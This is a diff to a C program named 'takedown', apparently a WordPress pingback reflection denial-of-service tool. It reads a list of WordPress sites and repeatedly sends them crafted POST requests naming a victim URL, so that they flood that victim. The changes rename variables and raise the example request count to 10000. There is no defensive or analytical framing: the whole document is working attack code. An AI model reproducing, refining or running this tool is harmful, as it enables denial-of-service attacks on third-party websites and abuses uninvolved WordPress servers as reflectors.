@@ -39,12 +39,12 @@
 int main(int argc, char *argv[]){
   if(argc != 4){
     fprintf(stderr, W "\nUsage: takedown requests targets_file victim\n" N);
-    fprintf(stderr, "\nEx: takedown 1000 wp_pingback www.victim.com\n\n");
+    fprintf(stderr, "\nEx: takedown 10000 wp_pingback www.victim.com\n\n");
     exit(1);
   }
 
   int cnt, ccnt, evilsocket, rand_post;
-  int cnt_lines = 0;
+  int cnt_targets = 0;
   int chars = 0;
   int req = atoi(argv[1]);
   char *file = argv[2];
@@ -58,16 +58,16 @@ int main(int argc, char *argv[]){
   while(!feof(wp_file)){
     chars = fgetc(wp_file);
     if(chars == '\n'){
-      cnt_lines++;
+      cnt_targets++;
     }
   }
   fclose(wp_file);
 
   char targets[100];
-  char arr_targets[cnt_lines][100];
+  char arr_targets[cnt_targets][100];
   wp_file = fopen(file, "r");
   cnt = 0;
-  while(cnt < cnt_lines){
+  while(cnt < cnt_targets){
     if(fgets(targets, 100, wp_file)){
       strcpy(arr_targets[cnt], targets);
     }
@@ -80,12 +80,12 @@ int main(int argc, char *argv[]){
   srand(time(NULL));
   char random_number[10];
   char victim[30];
-  char buff[cnt_lines][MAX];
-  struct hostent *h;
+  char buff[cnt_targets][MAX];
+  struct hostent *host;
   struct sockaddr_in serv_addr;
   while(ccnt < req){
-    while(cnt < cnt_lines){
-      rand_post = rand()%10000 + 1;
+    while(cnt < cnt_targets){
+      rand_post = rand()%9999 + 1;
       sprintf(random_number, "?p=%d", rand_post);
       strcpy(victim, argv[3]);
       strcat(victim, random_number);
@@ -116,11 +116,11 @@ int main(int argc, char *argv[]){
         "Content-Type: application/x-www-form-urlencoded\r\n"
         "Content-Length: %d\r\n\r\n%s", domain, content_lenght, content);
     
-      h = gethostbyname(domain);
+      host = gethostbyname(domain);
       memset(&serv_addr, 0, sizeof(serv_addr));
       serv_addr.sin_family = AF_INET;
       serv_addr.sin_port = htons(80);
-      serv_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*((struct in_addr *) h->h_addr)));
+      serv_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*((struct in_addr *) host->h_addr)));
       evilsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
       connect(evilsocket, (struct sockaddr*) &serv_addr, sizeof(serv_addr));
       if(write(evilsocket, buff[cnt], strlen(buff[cnt]) + 1) == -1)
@@ -131,7 +131,7 @@ int main(int argc, char *argv[]){
     ccnt++;
   }
   memset(&buff, 0, sizeof(buff));
-  memset(&h, 0, sizeof(h));
+  memset(&host, 0, sizeof(host));
   memset(&serv_addr, 0, sizeof(serv_addr));
   return(0);
 }
